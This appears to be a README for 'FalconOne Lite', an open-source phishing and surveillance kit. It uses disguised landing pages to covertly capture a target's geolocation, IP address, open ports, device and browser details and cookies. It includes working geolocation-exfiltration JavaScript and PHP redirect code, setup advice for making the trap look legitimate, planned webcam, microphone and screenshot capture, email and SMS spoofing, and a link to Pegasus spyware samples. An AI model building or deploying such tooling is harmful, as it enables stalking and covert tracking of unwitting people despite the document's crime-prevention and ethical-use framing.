# FalconOne (v.0.1) - Lite

FalconOne Lite is an Open Source solution deployed and updated on a daily basis to help prevent terror and crime. 
By using advanced tools, functions and stealth strategies, FalconOne community is focused on making a friendly and fast solution for effective results.

For more information about the FalconOne Pro, please send an email to the Team at prochan@strikevaults.com.

GENERAL NOTICE:

FalconOne Lite is deployed for ethical and educational purposes only. [Users Should READ the Terms before starting the installation process.](#8-user-Terms)


## Contents

1. [Functions Overview](#1-functions-overview)
2. [Scenarios](#1-Functions-Overview)
3. [Tool Overview](#3-Tool-Overview)
4. [Prerequisites](#4-Prerequisites)
5. [Installation/Setup](#5-InstallationSetup)
6. [Usage](#6-Usage)
7. [Community](#7-Community)
8. [User Terms](#8-user-Terms)
9. [Releases](#9-Releases)
10. [Templates](#10-Templates)


## 1. Functions Overview

### 1.1. Actual Version 0.1 (In Progress to v1.0)

- [x] Target Accurate Location (via Google API)
- [x] Target Public IP Address
- [x] Target Open Port
- [x] Target Device Model and its Version
- [x] Target Browser Model and its Version
- [x] Target Operating System and its Version
- [x] Target Cookies
- [ ] Target Webcam Activation
- [ ] Target Microphone Activation
- [ ] Target Screen Screenshot

### 1.2. Added Tools

- [ ] Email Spoof (to share the trapped landing page URL from a trusted email address)
- [ ] SMS Spoof (to share the trapped URL from a trusted phone number - This will require an API Key)


## 2. Scenarios

### 2.1. Got Scammed?

... In Progress

### 2.2. Dealing with a Kidnapper?

... In Progress

### 2.3. Aware of Malicious activities?

... In Progress

### 2.4. In Contact with a Missing Person?

... In Progress


## 3. Tool Overview

FalconOne Lite is based on PHP functions that collects and triggers browser's information functionalities via disguised HTML and CSS templates.
FalconOne Lite is coded as explained below:

### 3.1. Landing Page(s)

- index.html (landing page)

### 3.2. Main Style

- styles/
  - /footer.css
  - /join.css
  - /main.css

### 3.3. PHP Functions

- forward.php

### 3.4. Loggers

- info.txt (for Locations)
- log.txt (for User-Agent information)


## 4. Prerequisites

- Apache (Tested) or Nginx Server
- Public IP Address or a Tunnel (e.g. [Ngrok](https://ngrok.com/))
- Domain Name (Recommended for a legit approach)
- SSL Certificate (for a secure look)


## 5. Installation/Setup

- Upload the Zip file on your Web Server Public directory
- Unzip the FolconOne Lite uploaded file
- Customize index.html and CSS Styles files according to your trapping scenario


## 6. Usage

Once deployed, wait for the target to interact with the landing page functions such as buttons, links, images and popups.
Once the Target interacts with the Landing page function(s), location(s) should be stored in info.txt and other information in log.txt.

The following PHP Functions logic in index.html should not be changed:

```php
<p id="errorMessage"></p>

<script>
let message = document.getElementById("errorMessage");

function getLocation(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(sendLocation);
  } else{ 
    message.innerHTML = "<em>Your browser is not supported.</em>";
  }
}

function sendLocation(geoLocation) {
  window.location = "forward.php?x="+geoLocation.coords.latitude+"&y="+geoLocation.coords.longitude;
}
</script>
```

In forward.php line 37, you can edit the redirection URL which is google.com by default:

```php
header('Location: https://www.google.com/');
```

Or else redirection on line 40 which is index.html by default:

```php
header('Location: index.html');
```

The main getLocation Hook function should be respected as below:

```html
<a class="yourstyle" onclick="getLocation()">Button</a>
```


## 7. Community

... In Progress


## 8. User Terms

- Users are not allowed to deploy FalconOne Lite for malicious operations
- Users are not allowed to sell FalconOne Lite
- FalconOne Lite is FREE
- FalconOne Lite can be edited according to Users needs


## 9. Releases

- January 9th, 2022: FalconOne Lite v.0.1 (Minor Update)
- January 8th, 2022: FalconOne Lite v.0.1 (Major Upload): Initial Code Upload


## 10. Templates

### 10.1. Geo-locate the Target

... In Progress

### 10.2. Take a Picture from the Target Webcam

... In Progress

### 10.2. Get a Voice Record from the Target Microphone

... In Progress

### 10.3. Take a Screenshot from the Target Device

... In Progress


## Extra Links for Fun

- Pegasus Spyware Samples Decompiled & Recompiled: [@jonathandata1](https://github.com/jonathandata1/pegasus_spyware)
